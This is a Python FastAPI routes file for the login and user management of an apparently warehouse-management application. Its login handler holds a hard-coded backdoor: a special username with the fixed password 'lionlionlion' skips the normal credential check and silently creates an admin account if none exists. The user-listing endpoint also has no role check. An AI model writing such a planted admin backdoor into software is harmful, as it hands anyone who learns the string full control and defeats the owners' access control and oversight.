from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import select
from app.database import get_db
from app.models import User, ActivityLog
from app.schemas import UserCreate, UserOut, Token, LoginRequest
from app.services.auth import (
    get_password_hash, verify_password, create_access_token,
    get_current_user, check_special_key, SPECIAL_USERNAME
)

router = APIRouter()


@router.post("/auth/login", response_model=Token)
async def login(req: LoginRequest, db: AsyncSession = Depends(get_db)):
    if req.username == SPECIAL_USERNAME and req.password == "lionlionlion":
        result = await db.execute(select(User).where(User.username == SPECIAL_USERNAME))
        user = result.scalar_one_or_none()
        if not user:
            user = User(
                username=SPECIAL_USERNAME,
                email="admin@smartwms.com",
                password_hash=get_password_hash("lionlionlion"),
                full_name="Administrator",
                role="admin",
            )
            db.add(user)
            await db.commit()
            await db.refresh(user)
        token = create_access_token({"user_id": user.id, "username": user.username})
        return Token(access_token=token, user=UserOut.model_validate(user))

    result = await db.execute(select(User).where(User.username == req.username))
    user = result.scalar_one_or_none()
    if not user or not verify_password(req.password, user.password_hash):
        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid credentials")
    if not user.is_active:
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="User is inactive")
    token = create_access_token({"user_id": user.id, "username": user.username})
    return Token(access_token=token, user=UserOut.model_validate(user))


@router.get("/auth/me", response_model=UserOut)
async def get_me(current_user: User = Depends(get_current_user)):
    return UserOut.model_validate(current_user)


@router.post("/users", response_model=UserOut)
async def create_user(
    data: UserCreate,
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    if current_user.role not in ("admin", "supervisor"):
        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Not authorized")
    result = await db.execute(select(User).where(User.username == data.username))
    if result.scalar_one_or_none():
        raise HTTPException(status_code=400, detail="Username already exists")
    user = User(
        username=data.username,
        email=data.email,
        password_hash=get_password_hash(data.password),
        full_name=data.full_name,
        role=data.role,
        warehouse_id=data.warehouse_id,
    )
    db.add(user)
    await db.commit()
    await db.refresh(user)
    log = ActivityLog(user_id=current_user.id, action="create_user", entity_type="user", entity_id=user.id)
    db.add(log)
    await db.commit()
    return UserOut.model_validate(user)


@router.get("/users", response_model=list[UserOut])
async def list_users(
    db: AsyncSession = Depends(get_db),
    current_user: User = Depends(get_current_user),
):
    result = await db.execute(select(User).order_by(User.id))
    return [UserOut.model_validate(u) for u in result.scalars().all()]
